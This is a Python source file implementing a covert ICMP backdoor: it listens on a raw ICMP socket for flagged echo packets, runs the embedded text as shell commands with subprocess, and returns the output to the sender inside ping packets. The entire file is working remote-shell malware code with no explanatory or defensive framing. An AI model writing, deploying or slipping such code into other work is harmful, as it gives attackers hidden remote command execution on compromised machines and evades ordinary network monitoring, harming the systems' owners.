#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket, os, subprocess, struct

RECV_DATA_FLAG = '@@'
SEND_DATA_FLAG = '$$'

SEND_HOST_FLAG      =  "\x00\x01"
SEND_CMD_FLAG       =  "\x00\x02"
RECV_CMD_RSP_FLAG   =  "\x01\x02"

def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff

    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
    pass

def pack_packet(payload):
    ICMP_ECHO_REQUEST = 8
    CHECK_SUM = 0
    ID = os.getpid() & 0xFFFF
    SEQ = 1

    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, CHECK_SUM, ID, SEQ)
    CHECK_SUM = checksum(header + payload)
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(CHECK_SUM), ID, SEQ)
    return header + payload
    pass

class ShellServer:

    s = None
    addr = None

    def create(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def send(self,payload):
        icmp = socket.getprotobyname("icmp")
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        payload = SEND_DATA_FLAG + payload  + SEND_DATA_FLAG
        packet = pack_packet(payload)
        s.sendto(packet, (self.addr, 1))
        s.close()
        pass

    def recv(self):
        data, (addr,port) = self.s.recvfrom(65535)
        if data[28:30] == RECV_DATA_FLAG and data[-2:] == RECV_DATA_FLAG :
            return data[30:-2], addr
            pass
        return None,None
        pass


    def work(self):
        while True:
            data,addr = self.recv()
            if data is None:
                continue
                pass
            if data[0:2] == SEND_HOST_FLAG : # set address
                self.addr = addr
                pass
            if data[0:2] == SEND_CMD_FLAG : # send command
                command = data[2:]
                proc2 = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                output = proc2.stdout.read() + proc2.stderr.read()
                output = RECV_CMD_RSP_FLAG + output
                self.send(output)
                pass
            pass

if __name__ == '__main__':
    server = ShellServer()
    server.create()
    server.work()